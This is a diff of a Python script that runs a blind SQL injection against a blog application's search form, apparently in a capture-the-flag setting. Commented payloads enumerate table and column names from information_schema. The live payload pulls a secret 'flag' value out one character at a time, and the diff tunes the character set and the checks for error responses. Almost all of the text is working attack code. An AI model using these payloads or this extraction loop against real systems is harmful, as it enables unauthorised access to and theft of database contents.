@@ -8,19 +8,21 @@ import requests
 import string
 
 def sqli():
-    target= "142.16.1.17"
+    target= "152.16.1.19"
     proxies= {"http":"http://127.0.0.1:8080",
             "https":"http://127.0.0.1:8080"}
     headers={"Content-Type": "multipart/form-data;boundary=---------------------------29609271438811050402597506081"}
-    cookies= {"TEST_ADMIN":"ab203bf128a1eb9bz648dd569c3cf8a7", "columns%2Fblog%2Ftestadmin%2Fblogs_view.php":"{%22blogs-title%22:true%2C%22blogs-category%22:true%2C%22blogs-tags%22:true%2C%22blogs-content%22:true%2C%22blogs-photo%22:true%2C%22blogs-date%22:true%2C%22blogs-author%22:true%2C%22blogs-posted%22:true}"
-            }
+    cookies= {"TEST_ADMIN":"538f00ec5f4e2992033eafced683a063"}
     secret=""
     count=0
-        
+    charlist= string.digits + string.ascii_letters + string.punctuation
+    
     for num in range(1,40):
-        if count > 101:
+        if count > 90:
             break
-        for char in string.printable:
+        else:
+            pass
+        for char in charlist:
             #payload=f"'or (SELECT IF(SUBSTRING(table_name,1,1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM information_schema.tables WHERE table_schema = 'flag' LIMIT 1)-- -"
             #payload=f"'or (SELECT IF(SUBSTRING(column_name,1,1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM information_schema.columns WHERE table_name='flag' AND table_schema = 'flag' LIMIT 1)-- -"
             payload=f"'or (SELECT IF(SUBSTRING(flag,{num},1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM flag.flag LIMIT 1)-- -"
@@ -180,7 +182,7 @@ Content-Disposition: form-data; name="SearchString"
 
             response= requests.get(url=f"http://{target}/blog/single.php?id=1", proxies=proxies, cookies=cookies, allow_redirects=True)
 
-            if len(response.text) > 1000:
+            if len(response.text) > 1000 and "error in your SQL" not in response.text and "Subquery returns more than 1 row" not in response.text:
                 secret += char
                 print(secret)
                 count= 0
